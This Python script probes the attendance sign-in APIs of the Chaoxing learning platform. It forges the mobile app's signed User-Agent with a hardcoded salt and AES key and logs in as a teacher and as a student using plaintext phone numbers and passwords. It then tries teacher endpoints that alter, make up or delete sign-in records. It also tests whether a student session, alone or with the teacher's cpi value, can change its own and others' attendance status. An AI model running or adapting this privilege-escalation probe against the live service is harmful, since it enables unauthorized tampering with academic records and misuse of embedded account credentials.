import base64, hashlib, json, os, uuid, requests, urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
REPORT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deep_sign_api_probe_results.json")

results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    r = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                                "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                                "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                                "independentId": "0", "independentNameId": "0"},
               allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def probe_api(session, method, url, params=None, data=None, extra_headers=None, tag=""):
    try:
        hdrs = {}
        if extra_headers:
            hdrs.update(extra_headers)
        if method == "GET":
            r = session.get(url, params=params, headers=hdrs, timeout=20, allow_redirects=False)
        elif method == "POST":
            if not hdrs.get("Content-Type"):
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            r = session.post(url, params=params, data=data, headers=hdrs, timeout=20, allow_redirects=False)
        elif method == "PUT":
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            r = session.put(url, params=params, data=data, headers=hdrs, timeout=20, allow_redirects=False)
        elif method == "PATCH":
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            r = session.patch(url, params=params, data=data, headers=hdrs, timeout=20, allow_redirects=False)
        else:
            r = session.get(url, params=params, headers=hdrs, timeout=20, allow_redirects=False)

        d = safe_json(r)
        is_json = isinstance(d, dict) and "_raw_status" not in d
        result = {
            "tag": tag,
            "method": method,
            "url": url,
            "status_code": r.status_code,
            "is_json": is_json,
            "response_preview": r.text[:500] if not is_json else json.dumps(d, ensure_ascii=False)[:500],
            "has_success": "success" in r.text.lower() if r.text else False,
            "has_error": "error" in r.text.lower() if r.text else False,
            "has_permission": any(kw in r.text for kw in ["权限", "无权", "拒绝", "denied", "forbidden", "unauthorized"]) if r.text else False,
            "content_length": len(r.text) if r.text else 0,
        }
        results.append(result)
        status_icon = "✓" if is_json else "✗"
        perm_icon = "🔒" if result["has_permission"] else "  "
        print(f"  [{status_icon}] {perm_icon} {method:6s} {tag:45s} HTTP {r.status_code} len={result['content_length']:6d} {r.text[:100] if r.text else ''}")
        return result
    except Exception as e:
        result = {"tag": tag, "method": method, "url": url, "error": str(e)}
        results.append(result)
        print(f"  [!] {method:6s} {tag:45s} ERROR: {e}")
        return result

def run():
    print("=" * 80)
    print(f"学习通签到管理API端点探测 - 教师端")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录教师账号...")
    s_teacher, puid_t = login("19712720708", "3.1415926Cpy")
    print(f"  教师puid={puid_t}")

    print("\n[2] 登录学生账号...")
    s_student, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  学生puid={puid_s}")

    print("\n[3] 获取签到活动列表...")
    r = s_teacher.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
                      params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"][:5]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append(aid)
            print(f"  活动: id={aid}, type={atype}, status={status}, name={name}")
    else:
        print(f"  活动列表获取失败: {r.text[:300]}")
        active_ids = ["5000163767353", "5000139908007", "5000139505593"]

    if not active_ids:
        active_ids = ["5000163767353", "5000139908007", "5000139505593"]

    test_aid = active_ids[0]
    print(f"\n  使用活动ID={test_aid}进行后续测试")

    base = "https://mobilelearn.chaoxing.com"
    base2 = "https://mooc1-api.chaoxing.com"

    common_params = {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t, "activeId": test_aid}
    common_data = {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t, "activeId": test_aid}
    referer = {"Referer": "https://mobilelearn.chaoxing.com/"}
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n" + "=" * 80)
    print("[4] 教师端签到管理API探测")
    print("=" * 80)

    probe_api(s_teacher, "GET", f"{base}/ppt/activeAPI/taskactivelist",
              params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t},
              tag="taskactivelist-GET")

    probe_api(s_teacher, "POST", f"{base}/ppt/activeAPI/taskactivelist",
              data={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t},
              extra_headers=ajax_hdr, tag="taskactivelist-POST")

    probe_api(s_teacher, "GET", f"{base}/pptSign/signedResult",
              params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
              extra_headers=referer, tag="signedResult-GET")

    probe_api(s_teacher, "POST", f"{base}/pptSign/signedResult",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
              extra_headers=ajax_hdr, tag="signedResult-POST")

    probe_api(s_teacher, "PUT", f"{base}/pptSign/signedResult",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                    "status": "1"},
              extra_headers=ajax_hdr, tag="signedResult-PUT")

    probe_api(s_teacher, "POST", f"{base}/pptSign/updateSignStatus",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                    "studentId": STUDENT_PUID, "status": "1"},
              extra_headers=ajax_hdr, tag="updateSignStatus-POST")

    probe_api(s_teacher, "GET", f"{base}/pptSign/updateSignStatus",
              params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                      "studentId": STUDENT_PUID, "status": "1"},
              tag="updateSignStatus-GET")

    probe_api(s_teacher, "POST", f"{base}/pptSign/updateSign",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                    "studentId": STUDENT_PUID, "status": "1"},
              extra_headers=ajax_hdr, tag="updateSign-POST")

    probe_api(s_teacher, "GET", f"{base}/pptSign/updateSign",
              params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                      "studentId": STUDENT_PUID, "status": "1"},
              tag="updateSign-GET")

    probe_api(s_teacher, "POST", f"{base}/pptSign/makeUpSign",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                    "studentId": STUDENT_PUID},
              extra_headers=ajax_hdr, tag="makeUpSign-POST")

    probe_api(s_teacher, "GET", f"{base}/pptSign/makeUpSign",
              params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                      "studentId": STUDENT_PUID},
              tag="makeUpSign-GET")

    probe_api(s_teacher, "POST", f"{base}/ppt/activeAPI/modifySignResult",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                    "studentId": STUDENT_PUID, "status": "1"},
              extra_headers=ajax_hdr, tag="modifySignResult-POST")

    probe_api(s_teacher, "GET", f"{base}/ppt/activeAPI/modifySignResult",
              params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t,
                      "studentId": STUDENT_PUID, "status": "1"},
              tag="modifySignResult-GET")

    probe_api(s_teacher, "POST", f"{base}/ppt/activeAPI/startSign",
              data={"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2"},
              extra_headers=ajax_hdr, tag="startSign-POST")

    probe_api(s_teacher, "POST", f"{base}/ppt/activeAPI/endSign",
              data={"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
              extra_headers=ajax_hdr, tag="endSign-POST")

    probe_api(s_teacher, "POST", f"{base}/ppt/activeAPI/deleteActive",
              data={"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
              extra_headers=ajax_hdr, tag="deleteActive-POST")

    probe_api(s_teacher, "GET", f"{base}/pptSign/stuSignajax",
              params={"activeId": test_aid, "uid": puid_t, "clientip": "", "latitude": "-1",
                      "longitude": "-1", "appType": "15", "fid": "0"},
              tag="stuSignajax-GET(teacher)")

    probe_api(s_teacher, "POST", f"{base}/pptSign/stuSignajax",
              data={"activeId": test_aid, "uid": puid_t, "clientip": "", "latitude": "-1",
                    "longitude": "-1", "appType": "15", "fid": "0"},
              extra_headers=ajax_hdr, tag="stuSignajax-POST(teacher)")

    probe_api(s_teacher, "GET", f"{base}/v2/apis/active/student/activelist",
              params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t},
              tag="v2-student-activelist-GET")

    probe_api(s_teacher, "GET", f"{base}/v2/apis/active/teacher/activelist",
              params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t},
              tag="v2-teacher-activelist-GET")

    probe_api(s_teacher, "POST", f"{base}/sign/signIn",
              data={"activeId": test_aid, "uid": puid_t, "clientip": "", "latitude": "-1",
                    "longitude": "-1", "appType": "15", "fid": "0"},
              extra_headers=ajax_hdr, tag="sign/signIn-POST")

    probe_api(s_teacher, "GET", f"{base}/pptSign/preSign",
              params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
              tag="preSign-GET(teacher)")

    probe_api(s_teacher, "POST", f"{base}/pptSign/preSign",
              data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
              extra_headers=ajax_hdr, tag="preSign-POST(teacher)")

    probe_api(s_teacher, "GET", f"{base}/pptSign/updateqrstatus",
              params={"activeId": test_aid, "uid": puid_t, "enc": "test"},
              tag="updateqrstatus-GET")

    probe_api(s_teacher, "POST", f"{base}/pptSign/updateqrstatus",
              data={"activeId": test_aid, "uid": puid_t, "enc": "test"},
              extra_headers=ajax_hdr, tag="updateqrstatus-POST")

    probe_api(s_teacher, "GET", f"{base}/mobileSign/signIn",
              params={"activeId": test_aid, "uid": puid_t},
              tag="mobileSign-signIn-GET")

    probe_api(s_teacher, "POST", f"{base}/mobileSign/signIn",
              data={"activeId": test_aid, "uid": puid_t},
              extra_headers=ajax_hdr, tag="mobileSign-signIn-POST")

    print("\n" + "=" * 80)
    print("[5] 教师端签到状态修改API深入探测")
    print("=" * 80)

    status_modify_apis = [
        ("POST", f"{base}/pptSign/updateSignStatus", "修改签到状态"),
        ("POST", f"{base}/pptSign/updateSign", "更新签到"),
        ("POST", f"{base}/ppt/activeAPI/modifySignResult", "修改签到结果"),
        ("POST", f"{base}/pptSign/makeUpSign", "补签"),
        ("POST", f"{base}/pptSign/signedResult", "签到结果POST"),
    ]

    for method, url, desc in status_modify_apis:
        for status_val in ["0", "1", "2", "3", "4", "5"]:
            data = {
                "activeId": test_aid,
                "classId": CLASS_ID,
                "courseId": COURSE_ID,
                "uid": puid_t,
                "studentId": STUDENT_PUID,
                "status": status_val,
                "signStatus": status_val,
            }
            probe_api(s_teacher, method, url, data=data, extra_headers=ajax_hdr,
                      tag=f"{desc}-status={status_val}")

    print("\n" + "=" * 80)
    print("[6] 学生端越权调用教师端API")
    print("=" * 80)

    student_probe_apis = [
        ("POST", f"{base}/pptSign/updateSignStatus", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生调用updateSignStatus-修改自己状态"),
        ("POST", f"{base}/pptSign/updateSignStatus", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s, "studentId": STUDENT_PUID, "status": "1"},
         "学生调用updateSignStatus-修改他人状态"),
        ("POST", f"{base}/pptSign/updateSign", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生调用updateSign-修改自己状态"),
        ("POST", f"{base}/ppt/activeAPI/modifySignResult", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "学生调用modifySignResult-修改自己状态"),
        ("POST", f"{base}/pptSign/makeUpSign", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s},
         "学生调用makeUpSign-补签自己"),
        ("POST", f"{base}/pptSign/signedResult", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s, "status": "1"},
         "学生POST signedResult"),
        ("GET", f"{base}/pptSign/signedResult", {"activeId": test_aid, "classId": CLASS_ID,
         "courseId": COURSE_ID, "uid": puid_s},
         "学生GET signedResult"),
        ("POST", f"{base}/pptSign/stuSignajax", {"activeId": test_aid, "uid": puid_s,
         "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
         "学生POST stuSignajax"),
        ("POST", f"{base}/sign/signIn", {"activeId": test_aid, "uid": puid_s,
         "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
         "学生POST sign/signIn"),
    ]

    for method, url, data, tag in student_probe_apis:
        probe_api(s_student, method, url, data=data, extra_headers=ajax_hdr, tag=tag)

    print("\n" + "=" * 80)
    print("[7] 学生端使用教师cpi越权调用")
    print("=" * 80)

    r = s_teacher.get(f"{base2}/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    teacher_cpi = ""
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        if str(c.get("id", "")) == CLASS_ID:
            teacher_cpi = str(c.get("cpi", ""))
            break
    print(f"  教师cpi={teacher_cpi}")

    if teacher_cpi:
        probe_api(s_student, "POST", f"{base}/pptSign/updateSignStatus",
                  data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                        "uid": puid_s, "studentId": puid_s, "status": "1", "cpi": teacher_cpi},
                  extra_headers=ajax_hdr,
                  tag="学生+cpi调用updateSignStatus")

        probe_api(s_student, "POST", f"{base}/ppt/activeAPI/modifySignResult",
                  data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                        "uid": puid_s, "studentId": puid_s, "status": "1", "cpi": teacher_cpi},
                  extra_headers=ajax_hdr,
                  tag="学生+cpi调用modifySignResult")

    print("\n" + "=" * 80)
    print("[8] 保存结果")
    print("=" * 80)

    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {REPORT_FILE}")
    print(f"  共探测 {len(results)} 个API端点")

    json_results = [r for r in results if r.get("is_json")]
    success_results = [r for r in results if r.get("has_success")]
    perm_denied = [r for r in results if r.get("has_permission")]
    print(f"  JSON响应: {len(json_results)}")
    print(f"  包含success: {len(success_results)}")
    print(f"  权限拒绝: {len(perm_denied)}")

    for r in success_results:
        print(f"    [SUCCESS] {r['tag']}: {r.get('response_preview', '')[:200]}")

if __name__ == "__main__":
    run()
